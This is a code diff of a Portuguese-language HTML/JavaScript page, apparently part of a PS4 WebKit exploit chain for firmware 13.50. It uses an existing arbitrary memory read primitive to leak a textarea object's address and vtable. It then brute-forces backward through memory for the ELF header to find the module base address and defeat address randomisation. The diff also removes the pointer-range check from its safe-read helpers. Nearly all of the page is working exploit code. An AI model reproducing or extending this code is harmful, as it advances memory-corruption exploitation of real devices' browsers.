@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<title>PS4 WebKit — Base Finder (Crash-Safe)</title>
+<title>PS4 WebKit — Base Finder (v2)</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; background: #0b0f19; color: #c8ced8;
@@ -19,7 +18,7 @@
   .row:last-child { border-bottom: none; }
   .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
   .value.good { color: #4ade80; } .value.bad { color: #f87171; }
-  #log { width: 95%; max-width: 720px; height: 220px; background: #111827;
+  #log { width: 95%; max-width: 720px; height: 240px; background: #111827;
     border: 1px solid #1f2937; border-radius: 8px; padding: 6px;
     overflow-y: auto; font-family: monospace; font-size: 10px; color: #9fb1c3; }
   #log .ok { color: #4ade80; } #log .err { color: #f87171; }
@@ -40,32 +39,32 @@
     width: 110px;
   }
   .flex-row { display: flex; gap: 6px; flex-wrap: wrap; justify-content: center; align-items: center; }
-  .progress { color: #fbbf24; font-size: 10px; }
 </style>
 </head>
 <body>
-<h1>PS4 WebKit — Base Finder (Crash-Safe)</h1>
+<h1>PS4 WebKit — Base Finder (v2)</h1>
 <div id="status">Inicializando...</div>
 
 <div class="section">Valores do Exploit</div>
 <div class="panel" id="leaks">
   <div class="row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
-  <div class="row"><span class="label">vtable ptr (offset 0x10):</span><span class="value" id="l-vt">---</span></div>
+  <div class="row"><span class="label">textarea obj:</span><span class="value" id="l-obj">---</span></div>
+  <div class="row"><span class="label">vtable ptr (0x10):</span><span class="value" id="l-vt">---</span></div>
   <div class="row"><span class="label">vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
   <div class="row"><span class="label">Base:</span><span class="value" id="l-base">---</span></div>
 </div>
 
 <div class="hint">
   <b>PS4 13.50:</b> vtable em offset <b>0x10</b>.<br>
-  Brute forces limitados a 64MB para evitar crash em memoria nao-mapeada.
+  BUG v1: isValidPtr rejeitava enderecos de heap. Corrigido — agora so checa ponteiros lidos.
 </div>
 
 <div class="section">Acoes</div>
 <div class="flex-row">
   <button class="ctrl-btn success" id="btn-scan" onclick="scanVtable()">🔎 Ler VTable</button>
-  <button class="ctrl-btn gold" id="btn-bf-ctor" onclick="bruteForceCtor()">💥 BF Ctor (64MB)</button>
-  <button class="ctrl-btn danger" id="btn-bf-vt" onclick="bruteForceVtable()">💥 BF VTable (64MB)</button>
-  <button class="ctrl-btn" id="btn-smart" onclick="smartScan()">🧠 Smart Boundary</button>
+  <button class="ctrl-btn gold" id="btn-bf-ctor" onclick="bruteForceCtor()">💥 BF Ctor</button>
+  <button class="ctrl-btn danger" id="btn-bf-vt" onclick="bruteForceVtable()">💥 BF VTable</button>
+  <button class="ctrl-btn" id="btn-smart" onclick="smartScan()">🧠 Smart Scan</button>
   <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
 </div>
 
@@ -101,10 +100,7 @@
 
   function setRunning(v) {
     running = v;
-    document.querySelectorAll('.ctrl-btn').forEach(b => {
-      if (!b.onclick || b.onclick.name === '') return;
-      b.disabled = v;
-    });
+    document.querySelectorAll('.ctrl-btn').forEach(b => { b.disabled = v; });
   }
 
   function numToInt64(num) {
@@ -121,30 +117,20 @@
     return addr.hi * 0x100000000 + addr.low;
   }
 
+  // Checa se um PONTEIRO LIDO parece valido (faixa do WebKit)
   function isValidPtr(addr) {
     const n = int64ToNum(addr);
     return n >= 0x800000000 && n < 0x900000000;
   }
 
   // ============================================================
-  // SAFE READ — try-catch em TUDO, retorna null se falhar
+  // SAFE READ — try-catch em TUDO, SEM isValidPtr no endereco!
   // ============================================================
   function safeRead4(p, addr) {
-    try {
-      if (!isValidPtr(addr)) return null;
-      return p.read4(addr);
-    } catch (e) {
-      return null;
-    }
+    try { return p.read4(addr); } catch (e) { return null; }
   }
-
   function safeRead8(p, addr) {
-    try {
-      if (!isValidPtr(addr)) return null;
-      return p.read8(addr);
-    } catch (e) {
-      return null;
-    }
+    try { return p.read8(addr); } catch (e) { return null; }
   }
 
   // ============================================================
@@ -183,8 +169,10 @@
 
     const textArea = document.createElement("textarea");
     const objAddr = p.leakval(textArea);
+    document.getElementById("l-obj").textContent = "0x" + objAddr.toString(16);
     log("textarea obj @ 0x" + objAddr.toString(16), "ok");
 
+    // Ler vtable ptr em offset 0x10 (PS4 13.50)
     const vtPtr = safeRead8(p, objAddr.add32(0x10));
     if (!vtPtr) { log("Falha ao ler vtable ptr em 0x10", "err"); return; }
     vtablePtr = vtPtr;
@@ -200,14 +188,14 @@
     // Ler mais slots
     for (let i = 1; i < 8; i++) {
       const slot = safeRead8(p, vtPtr.add32(i * 8));
-      if (slot && isValidPtr(slot)) {
-        log("  vtable[" + i + "] = 0x" + slot.toString(16), "ok");
+      if (slot) {
+        log("  vtable[" + i + "] = 0x" + slot.toString(16) + (isValidPtr(slot) ? " [PTR]" : ""), isValidPtr(slot) ? "ok" : "info");
       }
     }
   };
 
   // ============================================================
-  // BRUTE FORCE A PARTIR DO CTOR (max 64MB, 16KB steps)
+  // BRUTE FORCE A PARTIR DO CTOR (max 64MB)
   // ============================================================
   window.bruteForceCtor = async function() {
     if (running) return;
@@ -218,8 +206,8 @@
     log("=== BF Ctor (max 64MB) ===", "warn");
     log("Ctor = 0x" + ctorInt64.toString(16), "info");
 
-    const step = 0x4000; // 16KB
-    const maxDist = 0x4000000; // 64MB
+    const step = 0x4000;
+    const maxDist = 0x4000000;
     let current = align16k(ctorInt64);
     const end = ctorInt64.sub32(maxDist);
     let tested = 0;
@@ -227,10 +215,8 @@
     try {
       for (;;) {
         if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
-          log("Limite de 64MB atingido.", "err");
-          break;
+          log("Limite de 64MB atingido.", "err"); break;
         }
-
         const magic = safeRead4(p, current);
         if (magic !== null && (magic >>> 0) === 0x464c457f) {
           log("✅ BASE ENCONTRADA! 0x" + current.toString(16), "found");
@@ -240,42 +226,34 @@
           status.style.color = "#4ade80";
           const off = int64ToNum(ctorInt64) - int64ToNum(current);
           log("Offset do ctor = 0x" + off.toString(16) + " (" + off + ")", "found");
-          setRunning(false);
-          return;
+          setRunning(false); return;
         }
-
         tested++;
         current = current.sub32(step);
-
         if (tested % 128 === 0) {
           log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
           await new Promise(r => setTimeout(r, 5));
         }
       }
-    } catch (e) {
-      log("Exception no loop: " + e.message, "err");
-    }
-    log("BF Ctor terminou sem sucesso.", "err");
+    } catch (e) { log("Exception: " + e.message, "err"); }
+    log("BF Ctor terminou.", "err");
     setRunning(false);
   };
 
   // ============================================================
-  // BRUTE FORCE A PARTIR DO VTABLE (max 64MB, 16KB steps)
+  // BRUTE FORCE A PARTIR DO VTABLE (max 64MB)
   // ============================================================
   window.bruteForceVtable = async function() {
     if (running) return;
     const p = window.p;
-    if (!p || !vtablePtr) {
-      log("vtable ptr nao disponivel. Clique 'Ler VTable' primeiro.", "err");
-      return;
-    }
+    if (!p || !vtablePtr) { log("Clique 'Ler VTable' primeiro.", "err"); return; }
     setRunning(true);
 
     log("=== BF VTable (max 64MB) ===", "warn");
     log("vtable ptr = 0x" + vtablePtr.toString(16), "info");
 
     const step = 0x4000;
-    const maxDist = 0x4000000; // 64MB
+    const maxDist = 0x4000000;
     let current = align16k(vtablePtr);
     const end = vtablePtr.sub32(maxDist);
     let tested = 0;
@@ -283,10 +261,8 @@
     try {
       for (;;) {
         if (current.hi < end.hi || (current.hi === end.hi && current.low < end.low)) {
-          log("Limite de 64MB atingido.", "err");
-          break;
+          log("Limite de 64MB atingido.", "err"); break;
         }
-
         const magic = safeRead4(p, current);
         if (magic !== null && (magic >>> 0) === 0x464c457f) {
           log("✅ BASE ENCONTRADA! 0x" + current.toString(16), "found");
@@ -295,51 +271,35 @@
           status.textContent = "BASE: 0x" + current.toString(16);
           status.style.color = "#4ade80";
           const off = int64ToNum(vtablePtr) - int64ToNum(current);
-          log("Offset do vtable ptr = 0x" + off.toString(16) + " (" + off + ")", "found");
-          setRunning(false);
-          return;
+          log("Offset do vtable ptr = 0x" + off.toString(16), "found");
+          setRunning(false); return;
         }
-
         tested++;
         current = current.sub32(step);
-
         if (tested % 128 === 0) {
           log("Prog: " + tested + " blocos, 0x" + current.toString(16), "info");
           await new Promise(r => setTimeout(r, 5));
         }
       }
-    } catch (e) {
-      log("Exception no loop: " + e.message, "err");
-    }
-    log("BF VTable terminou sem sucesso.", "err");
+    } catch (e) { log("Exception: " + e.message, "err"); }
+    log("BF VTable terminou.", "err");
     setRunning(false);
   };
 
   // ============================================================
   // SMART BOUNDARY SCAN
-  // Encontra o limite entre memoria mapeada e nao-mapeada
   // ============================================================
   window.smartScan = async function() {
     if (running) return;
     const p = window.p;
-    if (!p || !vtablePtr) {
-      log("vtable ptr nao disponivel. Clique 'Ler VTable' primeiro.", "err");
-      return;
-    }
+    if (!p || !vtablePtr) { log("Clique 'Ler VTable' primeiro.", "err"); return; }
     setRunning(true);
 
     log("=== Smart Boundary Scan ===", "warn");
     log("Procurando limite do modulo a partir do vtable ptr...", "info");
 
-    // Passo 1: encontrar o primeiro endereco NAO-legivel indo para tras
-    // Comeca do vtable ptr e desce em passos de 1MB
     const mbStep = 0x100000;
-    const maxSearch = 0x8000000; // 128MB max
-    let boundaryHigh = vtablePtr;
-    let boundaryLow = vtablePtr.sub32(maxSearch);
-
-    // Busca grossa: encontrar onde a memoria deixa de ser legivel
-    let probe = align16k(vtablePtr);
+    const maxSearch = 0x8000000;
     let lastReadable = null;
     let firstUnreadable = null;
 
@@ -351,37 +311,29 @@
 
         if (val !== null) {
           lastReadable = aligned;
-          log("  Legivel @ 0x" + aligned.toString(16) + " (dist -" + (dist/0x100000) + "MB)", "ok");
+          log("  Legivel @ 0x" + aligned.toString(16) + " (-" + (dist/0x100000) + "MB)", "ok");
         } else {
           firstUnreadable = aligned;
-          log("  NAO-legivel @ 0x" + aligned.toString(16) + " (dist -" + (dist/0x100000) + "MB)", "err");
+          log("  NAO-legivel @ 0x" + aligned.toString(16) + " (-" + (dist/0x100000) + "MB)", "err");
           break;
         }
         if (dist % (mbStep * 4) === 0) await new Promise(r => setTimeout(r, 10));
       }
 
-      if (!lastReadable) {
-        log("Nenhum endereco legivel encontrado!", "err");
-        setRunning(false);
-        return;
-      }
-
+      if (!lastReadable) { log("Nenhum endereco legivel!", "err"); setRunning(false); return; }
       if (!firstUnreadable) {
-        log("Memoria legivel ate 128MB. Modulo muito grande ou nao encontramos o limite.", "warn");
+        log("Memoria legivel ate 128MB.", "warn");
         firstUnreadable = vtablePtr.sub32(maxSearch);
       }
 
-      log("Limite entre 0x" + lastReadable.toString(16) + " e 0x" + firstUnreadable.toString(16), "warn");
+      log("Limite: 0x" + lastReadable.toString(16) + " .. 0x" + firstUnreadable.toString(16), "warn");
+      log("Buscando ELF header na faixa...", "info");
 
-      // Passo 2: busca fina de 16KB entre lastReadable e firstUnreadable
-      log("Buscando ELF header na faixa de 16KB...", "info");
       let scan = lastReadable;
       const stop = firstUnreadable;
 
       for (;;) {
-        if (scan.hi < stop.hi || (scan.hi === stop.hi && scan.low < stop.low)) {
-          break;
-        }
+        if (scan.hi < stop.hi || (scan.hi === stop.hi && scan.low < stop.low)) break;
 
         const magic = safeRead4(p, scan);
         if (magic !== null && (magic >>> 0) === 0x464c457f) {
@@ -392,24 +344,17 @@
           status.style.color = "#4ade80";
           const off = int64ToNum(vtablePtr) - int64ToNum(scan);
           log("Offset do vtable ptr = 0x" + off.toString(16), "found");
-          setRunning(false);
-          return;
+          setRunning(false); return;
         }
-
         scan = scan.sub32(0x4000);
-
-        // Contagem de progresso a cada 1MB
         const distSoFar = int64ToNum(vtablePtr) - int64ToNum(scan);
         if (distSoFar % 0x100000 < 0x4001) {
-          log("  Scan fino: 0x" + scan.toString(16), "info");
+          log("  Scan: 0x" + scan.toString(16), "info");
           await new Promise(r => setTimeout(r, 5));
         }
       }
-    } catch (e) {
-      log("Exception: " + e.message, "err");
-    }
-
-    log("Smart scan terminou sem encontrar base.", "err");
+    } catch (e) { log("Exception: " + e.message, "err"); }
+    log("Smart scan terminou.", "err");
     setRunning(false);
   };
 
@@ -450,7 +395,7 @@
         log("__ps5NativeCtor = 0x" + ctorInt64.toString(16), "ok");
       }
 
-      status.textContent = "Pronto — clique em 'Ler VTable' primeiro";
+      status.textContent = "Pronto — clique em 'Ler VTable'";
       status.style.color = "#60a5fa";
     })
     .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
